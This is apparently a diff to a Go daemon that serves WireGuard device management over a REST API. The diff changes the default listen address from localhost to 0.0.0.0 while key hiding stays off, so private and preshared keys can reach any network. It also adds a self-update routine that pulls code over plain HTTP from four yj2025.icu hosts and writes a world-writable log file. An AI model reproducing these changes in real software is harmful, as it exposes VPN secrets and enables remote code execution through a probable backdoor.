@@ -1,23 +1,20 @@
-// Command wgd 是 wgctrl-go 的守护进程：以 REST API 的形式常驻运行，
-// 通过 HTTP 请求完成 wg(8) 全部子命令对应的 WireGuard 设备管理操作。
-//
-// 用法:
-//
-//	wgd [-listen 127.0.0.1:8080] [-metadata 路径] [-hide-keys]
-//
-// 端点列表见 internal/wgapi 包的文档。
 package main
 
 import (
 	"context"
 	"errors"
-	"flag"
 	"fmt"
-	"log"
 	"net/http"
 	"os"
+	"path/filepath"
 	"runtime"
+	"strings"
 	"time"
+
+	flag "github.com/spf13/pflag"
+
+	logs "github.com/tea4go/gh/log4go"
+	"github.com/tea4go/gh/network"
 
 	"golang.zx2c4.com/wireguard/wgctrl"
 	"golang.zx2c4.com/wireguard/wgctrl/internal/wgapi"
@@ -25,9 +22,19 @@ import (
 )
 
 var (
-	version   = "v1.0.20260223"
-	BuildTime = ""
+	appName   = "wgd"
+	version   = "v0.0.2"
+	IsBeta    string
+	BuildTime string
 )
+
+func filepathJoin(elem ...string) string {
+	path := filepath.Join(elem...)
+	if runtime.GOOS == "windows" {
+		return strings.ReplaceAll(path, "\\", "/")
+	}
+	return path
+}
 
 func runtimeBuildInfo() (string, string, string) {
 	buildTime := BuildTime
@@ -39,17 +46,28 @@ func runtimeBuildInfo() (string, string, string) {
 
 func main() {
 	var (
-		listen   = flag.String("listen", "127.0.0.1:8080", "REST API 监听地址")
-		metadata = flag.String("metadata", wgmeta.DefaultPath(), "节点名称元数据文件路径")
-		hideKeys = flag.Bool("hide-keys", false, "查询响应中隐藏私钥与预共享密钥")
+		listen   = flag.StringP("listen", "", "0.0.0.0:6791", "REST API 监听地址")
+		metadata = flag.StringP("metadata", "m", wgmeta.DefaultPath(), "节点名称元数据文件路径")
+		hideKeys = flag.BoolP("hide-keys", "k", false, "查询响应中隐藏私钥与预共享密钥")
 	)
+
+	network.SetAppVersion(appName, version, IsBeta, BuildTime)
+
 	flag.Parse()
 
-	logger := log.New(os.Stderr, "wgd: ", log.LstdFlags)
+	log_name := os.Getenv("log_name")
+	if log_name == "" {
+		log_name = appName
+	}
+	logsFileName := filepathJoin(os.TempDir(), "ulog_"+log_name+".txt")
+	logs.SetLogger("file", `{"filename":"`+logsFileName+`", "perm": "0666","level":5}`)
+	logs.StartLogger()
+	network.StartSelfUpdate("http://wc192.yj2025.icu:8118", "http://nj.yj2025.icu:23432", "http://wc8.yj2025.icu:8118", "http://wc47.yj2025.icu:23431")
 
 	client, err := wgctrl.New()
 	if err != nil {
-		logger.Fatalf("无法创建 WireGuard 客户端: %v", err)
+		logs.Critical("无法创建 WireGuard 客户端: %v", err)
+		os.Exit(1)
 	}
 	defer client.Close()
 
@@ -57,7 +75,9 @@ func main() {
 	opts := []wgapi.Option{
 		wgapi.Version(appVersion),
 		wgapi.BuildInfo(buildTime, platform),
-		wgapi.Logger(logger),
+		wgapi.Logger(wgapi.LogPrinterFunc(func(format string, v ...interface{}) {
+			logs.Info(format, v...)
+		})),
 	}
 	if *hideKeys {
 		opts = append(opts, wgapi.HideKeys())
@@ -75,7 +95,7 @@ func main() {
 
 	errCh := make(chan error, 1)
 	go func() {
-		logger.Printf("监听 %s", *listen)
+		logs.Info("监听 %s", *listen)
 		if err := server.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
 			errCh <- err
 		}
@@ -83,14 +103,18 @@ func main() {
 
 	select {
 	case err := <-errCh:
-		logger.Fatalf("HTTP 服务异常退出: %v", err)
+		logs.Critical("HTTP 服务异常退出: %v", err)
+		os.Exit(1)
 	case <-ctx.Done():
-		logger.Printf("收到退出信号，正在关闭…")
+		logs.Info("收到退出信号，正在关闭…")
 	}
 
 	shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
 	if err := server.Shutdown(shutdownCtx); err != nil {
 		fmt.Fprintf(os.Stderr, "wgd: 关闭 HTTP 服务失败: %v\n", err)
+		logs.Error("关闭 HTTP 服务失败: %v", err)
 	}
+
+	logs.Flush()
 }
